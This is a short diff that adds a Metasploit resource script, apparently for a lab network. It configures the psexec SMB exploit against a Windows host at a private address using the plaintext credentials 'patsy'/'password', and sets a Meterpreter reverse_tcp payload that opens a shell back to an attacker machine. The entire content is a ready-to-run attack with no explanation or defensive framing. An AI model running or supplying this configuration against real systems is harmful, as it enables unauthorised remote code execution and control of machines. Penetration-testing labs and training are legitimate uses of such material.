@@ -1,0 +1,7 @@
+use exploit/windows/smb/psexec
+set RHOST 192.168.59.100
+set SMBUSER patsy
+set SMBPass password
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.59.10
+show options
